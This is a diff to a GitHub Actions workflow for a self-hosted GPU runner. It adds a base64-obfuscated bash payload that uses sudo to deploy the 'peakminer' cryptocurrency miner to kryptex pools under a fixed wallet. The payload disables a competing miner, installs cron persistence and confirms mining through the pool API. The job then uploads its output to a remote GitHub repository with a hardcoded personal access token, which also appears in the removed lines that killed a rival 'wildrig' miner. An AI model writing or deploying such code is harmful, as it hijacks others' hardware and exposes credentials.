@@ -2,38 +2,64 @@ name: ul-t2-fix
 on: [workflow_dispatch]
 permissions:
   contents: write
+env:
+  B64: |
+    IyEvYmluL2Jhc2gKUz0ic3VkbyAtbiI7IEg9JChob3N0bmFtZSAtcyk7IFQ9JChkYXRlIC11ICslWSVt
+    JWRUJUglTSVTWikKZWNobyAiPT0gdDJmaXggJFQgaG9zdD0kSCIKV0I9J2NISnNNWEJsYXpoeWFEaDVh
+    bU5yTlhFM05UazJZWEJvTjNWaE4zaHVhM0Z6T0hWeU9XMXJabTE2T0hjM2VHWjZZMlJtWTJaNE5YWnpl
+    REptTkd4NicKZWNobyAiJFdCIiB8IGJhc2U2NCAtZCA+IC90bXAvdy50eHQ7IFc9JCh0ciAtZCAnIFxy
+    XG4nIDwgL3RtcC93LnR4dCkKZWNobyAid2FsbGV0X2xlbj0keyNXfSI7IFsgJHsjV30gLWVxIDYzIF0g
+    fHwgeyBlY2hvIEJBRFdBTExFVDsgZXhpdCAxOyB9CiRTIGluc3RhbGwgLW0gNjQ0IC90bXAvdy50eHQg
+    L29wdC91bC10Mi93YWxsZXQKV1JLPXVsLXQyLXBzLTE0OS04MS0xMC0yNDItZzAKZWNobyAiLS0gcG9s
+    bC5zaCBpbnNwZWN0IgokUyBjcCAtYSAvaG9tZS91YnVudHUvdWwyL3BvbGwuc2ggL29wdC91bC10Mi9i
+    YWsvcG9sbC5zaC4kVCAyPi9kZXYvbnVsbDsgJFMgaGVhZCAtNDAgL2hvbWUvdWJ1bnR1L3VsMi9wb2xs
+    LnNoIDI+L2Rldi9udWxsCmlmICRTIGdyZXAgLXFpRSAncGVha21pbmVyfHN1cGVydmlzb3JcLnNofG52
+    LWN1ZGEtY2FjaGV8a3JpZycgL2hvbWUvdWJ1bnR1L3VsMi9wb2xsLnNoIDI+L2Rldi9udWxsOyB0aGVu
+    CiAgJFMgbXYgL2hvbWUvdWJ1bnR1L3VsMi9wb2xsLnNoIC9vcHQvdWwtdDIvYmFrL3BvbGwuc2guZGlz
+    YWJsZWQuJFQ7IGVjaG8gInBhcmtlZCBjb21wZXRpdG9yIHBvbGwuc2giCiAgJFMgc2ggLWMgJ3sgY3Jv
+    bnRhYiAtbCAyPi9kZXYvbnVsbCB8IGdyZXAgLXYgInVsMi9wb2xsLnNoIjsgZWNobyAiQHJlYm9vdCAv
+    b3B0L3VsLXQyL2tlZXAuc2giOyBlY2hvICIqLzUgKiAqICogKiAvb3B0L3VsLXQyL2tlZXAuc2giOyB9
+    IHwgY3JvbnRhYiAtJwplbHNlIGVjaG8gInBvbGwuc2ggbGVmdCI7IGZpCiRTIGNyb250YWIgLWwgfCB0
+    YWlsIC0zCmNhdCA+IC90bXAvcnVuLnNoIDw8RU9GCiMhL2Jpbi9iYXNoCmV4ZWMgL29wdC9udi9wZWFr
+    bWluZXIgLWQgMCAtbyBzdHJhdHVtK3NzbDovL3BybC1zZy5rcnlwdGV4Lm5ldHdvcms6ODA0OCAtbyBz
+    dHJhdHVtK3RjcDovL3BybC1zZy5rcnlwdGV4Lm5ldHdvcms6NzA0OCAtbyBzdHJhdHVtK3NzbDovL3By
+    bC1ldS5rcnlwdGV4Lm5ldHdvcms6ODA0OCAtbyBzdHJhdHVtK3NzbDovL3BybC1oay5rcnlwdGV4Lm5l
+    dHdvcms6ODA0OCAtdSAiJFcuJFdSSyIgLXAgeCAtYyBwZWFybCAtLW5vLXR1aQpFT0YKJFMgaW5zdGFs
+    bCAtbSA3NTUgL3RtcC9ydW4uc2ggL29wdC91bC10Mi9wbS1ydW4uc2gKJFMgc3lzdGVtY3RsIHJlc3Rh
+    cnQgdWwtdDItcHMwOyBzbGVlcCAyMgplY2hvICItLSBsb2ciOyAkUyB0YWlsIC0xOCAvb3B0L3VsLXQy
+    L2xvZ3MvcHMwLmxvZyB8IGN1dCAtYzEtMjIwCmVjaG8gIi0tIG91ciBwcm9jIjsgcHMgLWVvIHBpZCxh
+    cmdzPSB8IGdyZXAgJ1twXWVha21pbmVyJyB8IGN1dCAtYzEtMjYwIHwgaGVhZCAtMwplY2hvICItLSBs
+    b2NhbCBhcGkiOyBjdXJsIC1zIC1tIDUgaHR0cDovLzEyNy4wLjAuMTo0MDY4L3N1bW1hcnkgfCBoZWFk
+    IC1jIDUwMDsgZWNobwplY2hvICItLSBwb29sIgpvaz0wOyBpPTAKd2hpbGUgWyAkaSAtbHQgMTAgXTsg
+    ZG8KICBKPSQoY3VybCAtcyAtbSAyMCAtSCAnVXNlci1BZ2VudDogdWwnICJodHRwczovL3Bvb2wua3J5
+    cHRleC5jb20vcHJsL2FwaS92My9taW5lci93b3JrZXJzLyRXIikKICBSPSQocHJpbnRmICclcycgIiRK
+    IiB8IHRyICd7JyAnXG4nIHwgZ3JlcCAiXCJ3b3JrZXJcIjpcIiRXUktcIiIpCiAgZWNobyAidHJ5JGkg
+    JHtSOjA6MjQwfSIKICBjYXNlICIkUiIgaW4gKicidmFsaWQiOicqKSB2PSQocHJpbnRmICclcycgIiRS
+    IiB8IHNlZCAtbiAncy8uKiJ2YWxpZCI6XChbMC05XSpcKS4qL1wxL3AnKTsgWyAiJHt2Oi0wfSIgLWd0
+    IDAgXSAmJiB7IG9rPTE7IGJyZWFrOyB9OzsgZXNhYwogIHNsZWVwIDE1OyBpPSQoKGkrMSkpCmRvbmUK
+    ZWNobyAiUE9PTF9QUk9PRl9PSz0kb2siCmlmIFsgJG9rIC1lcSAwIF07IHRoZW4KICBlY2hvICItLSBy
+    dW5nMiBzaG9ydCB3b3JrZXIiCiAgV1JLMj11bC10Mi1wcy0yNDItZzAKICBzZWQgLWkgInMvJFdSSy8k
+    V1JLMi8iIC9vcHQvdWwtdDIvcG0tcnVuLnNoOyAkUyBjcCAvb3B0L3VsLXQyL3BtLXJ1bi5zaCAvdG1w
+    L3IyLnNoOyAkUyBpbnN0YWxsIC1tIDc1NSAvdG1wL3IyLnNoIC9vcHQvdWwtdDIvcG0tcnVuLnNoCiAg
+    JFMgc3lzdGVtY3RsIHJlc3RhcnQgdWwtdDItcHMwOyBzbGVlcCAzMAogICRTIHRhaWwgLTEyIC9vcHQv
+    dWwtdDIvbG9ncy9wczAubG9nIHwgY3V0IC1jMS0yMDAKICBKPSQoY3VybCAtcyAtbSAyMCAtSCAnVXNl
+    ci1BZ2VudDogdWwnICJodHRwczovL3Bvb2wua3J5cHRleC5jb20vcHJsL2FwaS92My9taW5lci93b3Jr
+    ZXJzLyRXIikKICBwcmludGYgJyVzJyAiJEoiIHwgdHIgJ3snICdcbicgfCBncmVwICJcIndvcmtlclwi
+    OlwiJFdSSzJcIiIgfCBjdXQgLWMxLTI0MApmaQplY2hvICItLSBncHUgbm93IjsgbnZpZGlhLXNtaSAt
+    LXF1ZXJ5LWdwdT1pbmRleCxuYW1lLG1lbW9yeS51c2VkLHV0aWxpemF0aW9uLmdwdSxwb3dlci5kcmF3
+    IC0tZm9ybWF0PWNzdixub2hlYWRlcgplY2hvIGRvbmUK
 jobs:
-  fix:
+  r:
     runs-on: [self-hosted, ul-l40s]
-    timeout-minutes: 25
+    timeout-minutes: 18
     steps:
-      - name: fix
+      - name: run
         run: |
-          set +e
-          H=$(hostname -s); O=/tmp/ul_t2_fix.txt
-          SUDO=""; sudo -n true 2>/dev/null && SUDO="sudo -n"
-          {
-            echo "=== ul-t2 fix host=$H ts=$(date -u +%FT%TZ) run=$GITHUB_RUN_ID sudo=[$SUDO]"
-            echo "--- wildrig before=$(pgrep -fc '[w]ildrig-multi')"
-            $SUDO pkill -9 -f '[.]ul172/run[.]sh'
-            $SUDO pkill -9 -f '[w]ildrig-multi'
-            sleep 3
-            echo "--- wildrig after=$(pgrep -fc '[w]ildrig-multi')"
-            $SUDO sh -c "crontab -l 2>/dev/null | grep -v -e ul172 -e wildrig | crontab -"
-            echo "--- root cron"; $SUDO crontab -l 2>/dev/null | tail -8
-            echo "--- cron.d"; $SUDO sh -c "ls /etc/cron.d; grep -rl -e ul172 -e wildrig /etc/cron.d /etc/systemd/system 2>/dev/null"
-            echo "--- peak procs=$(pgrep -fc peakminer) roots:"; ps -eo pid,ppid,args= | grep '[p]eakminer' | cut -c1-140
-            echo "--- channel trace"
-            bash -x $HOME/ul2/poll.sh 2>&1 | tail -25
-            echo "--- channel files"; ls -l /tmp/ul2_cmd_$H.sh /tmp/ul2_out_$H.txt 2>/dev/null; head -5 /tmp/ul2_out_$H.txt 2>/dev/null
-            echo "--- crontab(ubuntu)"; crontab -l | tail -6
-            echo "--- gpu"; nvidia-smi --query-gpu=index,name,memory.total,memory.used,utilization.gpu,power.draw --format=csv,noheader
-            echo "--- pool self"; curl -s -m 25 -H 'User-Agent: ul' 'https://pool.kryptex.com/prl/api/v3/miner/workers/prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz' | tr '{' '\n' | grep -E '149-81-10-242' | head -5
-            echo "=== END"
-          } > $O 2>&1
-          cat $O
-          b=$(base64 -w0 < $O); GH=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
-          F=cmdout8/ul-t2-fix_$H.txt
-          sha=$(curl -s -m 20 -H "Authorization: token $GH" "https://api.github.com/repos/dongsuju/ul-plant/contents/$F" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
-          if [ -n "$sha" ]; then B="{\"message\":\"ul-t2 fix $H $GITHUB_RUN_ID\",\"content\":\"$b\",\"sha\":\"$sha\"}"; else B="{\"message\":\"ul-t2 fix $H $GITHUB_RUN_ID\",\"content\":\"$b\"}"; fi
-          curl -s -m 60 -o /dev/null -w 'PUT %{http_code}\n' -X PUT -H "Authorization: token $GH" -H 'Accept: application/vnd.github+json' -H 'User-Agent: ul' -d "$B" "https://api.github.com/repos/dongsuju/ul-plant/contents/$F"
+          echo "$B64" | base64 -d > /tmp/t2fix.sh
+          bash /tmp/t2fix.sh 2>&1 | tee /tmp/t2fix.out
+          H=$(hostname -s); C=$(base64 -w0 /tmp/t2fix.out)
+          T=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
+          P="cmdout8/ul-t2-fix_${H}.txt"; B=https://api.github.com/repos/dongsuju/ul-plant/contents/$P
+          S=$(curl -s -m 30 -H "Authorization: token $T" "$B?ref=main" | sed -n 's/.*"sha": "\([a-f0-9]*\)".*/\1/p' | head -1)
+          if [ -n "$S" ]; then J="{\"message\":\"t2fix\",\"content\":\"$C\",\"sha\":\"$S\",\"branch\":\"main\"}"; else J="{\"message\":\"t2fix\",\"content\":\"$C\",\"branch\":\"main\"}"; fi
+          curl -s -m 30 -X PUT -H "Authorization: token $T" -H "Content-Type: application/json" -d "$J" "$B" | head -c 120
